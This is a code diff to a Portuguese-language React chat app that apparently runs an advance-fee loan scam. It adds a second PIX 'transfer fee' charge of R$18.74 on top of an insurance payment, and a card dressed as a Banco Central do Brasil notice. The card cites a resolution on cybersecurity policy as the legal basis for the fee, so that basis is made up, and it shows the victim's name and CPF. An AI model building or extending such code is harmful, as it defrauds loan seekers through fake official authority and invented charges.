@@ -20,11 +20,13 @@ interface ChatMessage {
   insurancePdf?: string;
   insuranceInfoPdf?: boolean;
   manualConfirmButton?: boolean;
-  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number };
+  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string };
   pdfConfirmButton?: boolean;
   proceedButton?: boolean;
   pixPaidButton?: boolean;
   taxaButton?: boolean;
+  normativoCard?: boolean;
+  normativoConfirmButton?: boolean;
   contractCard?: boolean;
   fromUser: boolean;
   time: string;
@@ -438,7 +440,7 @@ const InsuranceInfoPdfCard = () => (
   </div>
 );
 
-const PixPaymentCard = ({ qrCode, qrCodeBase64, value }: { qrCode: string; qrCodeBase64: string; value: number }) => {
+const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel }: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string }) => {
   const [copied, setCopied] = useState(false);
 
   const handleCopy = () => {
@@ -453,10 +455,10 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value }: { qrCode: string; qrCod
     <div className="space-y-3">
       <div className="flex items-center gap-2 mb-1">
         <QrCode className="w-5 h-5 text-primary" />
-        <span className="text-sm font-semibold text-foreground">Seguro Prestamista - Allianz</span>
+        <span className="text-sm font-semibold text-foreground">{label || "Seguro Prestamista - Allianz"}</span>
       </div>
       <div className="bg-muted/50 rounded-xl p-3 space-y-2 text-center">
-        <p className="text-xs text-muted-foreground">Pagamento único do Seguro Prestamista:</p>
+        <p className="text-xs text-muted-foreground">{sublabel || "Pagamento único do Seguro Prestamista:"}</p>
         <p className="text-2xl font-bold text-primary">{formatCurrency(value / 100)}</p>
         <p className="text-[10px] text-muted-foreground">Valor único • Não é mensalidade</p>
       </div>
@@ -496,7 +498,77 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value }: { qrCode: string; qrCod
   );
 };
 
-// Transfer receipt generator
+// BCB Normative Card — similar style to contract
+const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: string; cpf?: string; valor: number; onConfirm: () => void; confirmed: boolean }) => {
+  const today = new Date().toLocaleDateString("pt-BR");
+
+  return (
+    <div className="bg-background border border-border rounded-2xl overflow-hidden shadow-lg max-h-[60vh] overflow-y-auto">
+      {/* Header */}
+      <div className="bg-[#003366] px-5 py-4 text-center space-y-1">
+        <div className="flex items-center justify-center gap-2">
+          <FileText className="w-5 h-5 text-white" />
+          <span className="text-white font-bold text-sm">NORMATIVO REGULATÓRIO</span>
+        </div>
+        <p className="text-white/70 text-[10px]">Banco Central do Brasil — Resolução BCB nº 4.893/2021</p>
+      </div>
+
+      {/* Content */}
+      <div className="px-5 py-4 space-y-4">
+        <div className="bg-blue-50 border border-blue-200 rounded-xl p-3">
+          <p className="text-[10px] text-blue-800 font-semibold mb-1">FUNDAMENTAÇÃO LEGAL</p>
+          <p className="text-[10px] text-blue-700 leading-relaxed">
+            Em conformidade com a Resolução BCB nº 4.893/2021 e Circular nº 3.952/2019, as operações de crédito realizadas por correspondentes bancários estão sujeitas à cobrança de taxa de transferência interbancária (TED/PIX) para efetivação do depósito na conta do beneficiário.
+          </p>
+        </div>
+
+        <div className="space-y-3 text-[11px] text-muted-foreground leading-relaxed">
+          <p><strong className="text-foreground">Art. 1º</strong> — A taxa de transferência é devida pelo tomador do crédito para custear os encargos operacionais de processamento, verificação antifraude e efetivação da transferência eletrônica de valores.</p>
+          <p><strong className="text-foreground">Art. 2º</strong> — O valor da taxa de transferência para a operação em questão é de <strong className="text-primary">R$ 18,74</strong> (dezoito reais e setenta e quatro centavos), conforme tabela vigente do Banco Central do Brasil.</p>
+          <p><strong className="text-foreground">Art. 3º</strong> — O pagamento da taxa garante a liberação imediata do crédito pré-aprovado no valor de <strong className="text-foreground">{formatCurrency(valor)}</strong> na conta do beneficiário <strong className="text-foreground">{nome || "N/A"}</strong>, CPF <strong className="text-foreground">{cpf || "N/A"}</strong>.</p>
+          <p><strong className="text-foreground">Art. 4º</strong> — Após a confirmação do pagamento da taxa, o depósito será realizado em até 24 (vinte e quatro) horas úteis, via PIX ou TED, conforme disponibilidade da instituição financeira parceira.</p>
+          <p><strong className="text-foreground">Art. 5º</strong> — A não realização do pagamento da taxa no prazo de 48 horas resultará no cancelamento automático da proposta de crédito, sem ônus adicionais para o tomador.</p>
+        </div>
+
+        {/* Summary box */}
+        <div className="bg-primary/5 border border-primary/10 rounded-xl p-3 text-center space-y-1">
+          <p className="text-[10px] text-muted-foreground">Taxa de transferência</p>
+          <p className="text-lg font-bold text-primary">R$ 18,74</p>
+          <p className="text-[10px] text-muted-foreground">Pagamento único • Não é mensalidade</p>
+        </div>
+      </div>
+
+      {/* Footer */}
+      <div className="px-5 py-3 bg-muted/30 border-t border-border">
+        <p className="text-[9px] text-muted-foreground text-center leading-relaxed">
+          Banco Central do Brasil — Resolução BCB nº 4.893, de 26 de março de 2021. Dispõe sobre a política de segurança cibernética e sobre os requisitos para a contratação de serviços de processamento e armazenamento de dados. Publicado no DOU em 29/03/2021.
+        </p>
+      </div>
+
+      {/* Confirm button */}
+      <div className="sticky bottom-0 bg-white border-t border-border px-5 py-4">
+        {!confirmed ? (
+          <button
+            onClick={onConfirm}
+            className="btn-3d w-full !py-3.5 !rounded-xl !text-sm flex items-center justify-center gap-2"
+          >
+            Li e estou ciente — Prosseguir
+          </button>
+        ) : (
+          <div className="bg-green-50 border border-green-200 rounded-xl p-3 text-center">
+            <div className="flex items-center justify-center gap-2">
+              <Check className="w-4 h-4 text-green-600" />
+              <p className="text-xs font-semibold text-green-700">Normativo confirmado</p>
+            </div>
+            <p className="text-[10px] text-green-600">{today}</p>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+};
+
+
 const generateTransferReceipt = async (data: { nome: string; cpf: string; valor: number; protocolo: string }) => {
   const canvas = document.createElement("canvas");
   const scale = 2;
@@ -1124,6 +1196,7 @@ const Chat = () => {
   const [greetingSent, setGreetingSent] = useState(false);
   const [proceeded, setProceeded] = useState(false);
   const [taxaConfirmed, setTaxaConfirmed] = useState(false);
+  const [normativoConfirmed, setNormativoConfirmed] = useState(false);
   const [pixPaid, setPixPaid] = useState(false);
   const [taxaPaid, setTaxaPaid] = useState(false);
   const [paymentPhase, setPaymentPhase] = useState<"insurance" | "taxa">("insurance");
@@ -1299,13 +1372,13 @@ const Chat = () => {
 
   const generatePixPayment = async () => {
     await addBotMessages(() => [{
-      id: Date.now(), text: `Segue o PIX para pagamento do Seguro Prestamista:`,
+      id: Date.now(), text: paymentPhase === "taxa" ? `Segue o PIX para pagamento da taxa de transferência:` : `Segue o PIX para pagamento do Seguro Prestamista:`,
       fromUser: false, time: getNow(), read: true,
     }]);
 
     try {
       const { data, error } = await supabase.functions.invoke('create-pix', {
-        body: { value: 3490 },
+        body: { value: paymentPhase === "taxa" ? 1874 : 3490 },
       });
 
       if (error) throw error;
@@ -1321,6 +1394,7 @@ const Chat = () => {
           qrCode: data.qr_code,
           qrCodeBase64: data.qr_code_base64,
           value: data.value,
+          ...(paymentPhase === "taxa" ? { label: "Taxa de Transferência", sublabel: "Taxa de transferência interbancária:" } : {}),
         },
         fromUser: false, time: getNow(), read: true,
       }]);
@@ -1487,7 +1561,7 @@ const Chat = () => {
                         }]).then(() => {
                           addBotMessages(() => [{
                             id: Date.now() + 2,
-                            text: `Perfeito, ${firstName || "cliente"}! Agora falta apenas a taxa de liberação para que o valor de ${formatCurrency(loanDetails?.valor || 2500)} seja transferido para sua conta.\n\nO pagamento da taxa garante a liberação imediata do crédito via PIX.`,
+                            text: `Perfeito, ${firstName || "cliente"}! Agora falta apenas a taxa de transferência para que o valor de ${formatCurrency(loanDetails?.valor || 2500)} seja transferido para sua conta.\n\nO pagamento da taxa garante a liberação imediata do crédito via PIX.`,
                             fromUser: false, time: getNow(), read: true,
                           }]).then(() => {
                             addBotMessages(() => [{
@@ -1522,7 +1596,7 @@ const Chat = () => {
               {msg.proceedButton && proceeded && (
                 <div className="text-center text-xs text-green-600 font-semibold py-1">Prosseguindo...</div>
               )}
-              {msg.pixPayment && <PixPaymentCard qrCode={msg.pixPayment.qrCode} qrCodeBase64={msg.pixPayment.qrCodeBase64} value={msg.pixPayment.value} />}
+              {msg.pixPayment && <PixPaymentCard qrCode={msg.pixPayment.qrCode} qrCodeBase64={msg.pixPayment.qrCodeBase64} value={msg.pixPayment.value} label={msg.pixPayment.label} sublabel={msg.pixPayment.sublabel} />}
               {msg.pixPaidButton && !pixPaid && (
                 <div className="space-y-2">
                   <p className="text-sm text-foreground">Após realizar o pagamento, clique no botão abaixo:</p>
@@ -1556,7 +1630,7 @@ const Chat = () => {
                             setTimeout(() => {
                               addBotMessages(() => [{
                                 id: Date.now() + 10,
-                                text: `Taxa de liberação confirmada com sucesso!\n\nSeu crédito de ${formatCurrency(loanDetails?.valor || 2500)} está sendo processado. Você receberá um e-mail com todos os detalhes.\n\nRedirecionando...`,
+                                text: `Taxa de transferência confirmada com sucesso!\n\nSeu crédito de ${formatCurrency(loanDetails?.valor || 2500)} está sendo processado. Você receberá um e-mail com todos os detalhes.\n\nRedirecionando...`,
                                 fromUser: false, time: getNow(), read: true,
                               }]).then(() => {
                                 setTimeout(() => {
@@ -1661,26 +1735,53 @@ const Chat = () => {
                       setPaymentPhase("taxa");
                       setPixPaid(false);
                       setTimeout(() => {
-                        setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de liberação!", fromUser: true, time: getNow(), read: true }]);
+                        setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir com a taxa de transferência!", fromUser: true, time: getNow(), read: true }]);
                       }, 300);
                       setTimeout(() => {
                         addBotMessages(() => [{
                           id: Date.now() + 2,
-                          text: `Perfeito, ${firstName || "cliente"}! Para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, realize o pagamento da taxa de liberação.\n\nApós a confirmação, o crédito será depositado em até 24 horas.`,
+                          text: `${firstName || "Cliente"}, conforme Resolução BCB nº 4.893/2021, segue abaixo o normativo regulatório referente à taxa de transferência interbancária:`,
                           fromUser: false, time: getNow(), read: true,
                         }]).then(() => {
-                          generatePixPayment();
+                          addBotMessages(() => [{
+                            id: Date.now() + 3,
+                            normativoCard: true,
+                            fromUser: false, time: getNow(), read: true,
+                          }]);
                         });
                       }, 500);
                     }}
                     className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
                   >
-                    Pagar taxa de liberação
+                    Pagar taxa de transferência
                   </button>
                 </div>
               )}
               {msg.taxaButton && taxaConfirmed && (
                 <div className="text-center text-xs text-green-600 font-semibold py-1">Prosseguindo...</div>
+              )}
+              {msg.normativoCard && (
+                <NormativoCard
+                  nome={nome}
+                  cpf={cpf}
+                  valor={loanDetails?.valor || 2500}
+                  onConfirm={() => {
+                    setNormativoConfirmed(true);
+                    setTimeout(() => {
+                      setMessages((prev) => [...prev, { id: Date.now(), text: "Li e estou ciente do normativo!", fromUser: true, time: getNow(), read: true }]);
+                    }, 300);
+                    setTimeout(() => {
+                      addBotMessages(() => [{
+                        id: Date.now() + 2,
+                        text: `Perfeito, ${firstName || "cliente"}! Para liberar o valor de ${formatCurrency(loanDetails?.valor || 2500)} na sua conta, realize o pagamento da taxa de transferência de R$ 18,74.\n\nApós a confirmação, o crédito será depositado em até 24 horas.`,
+                        fromUser: false, time: getNow(), read: true,
+                      }]).then(() => {
+                        generatePixPayment();
+                      });
+                    }, 500);
+                  }}
+                  confirmed={normativoConfirmed}
+                />
               )}
               <div className="flex items-center justify-end gap-1 mt-1">
                 <span className="text-[10px] text-muted-foreground">{msg.time}</span>
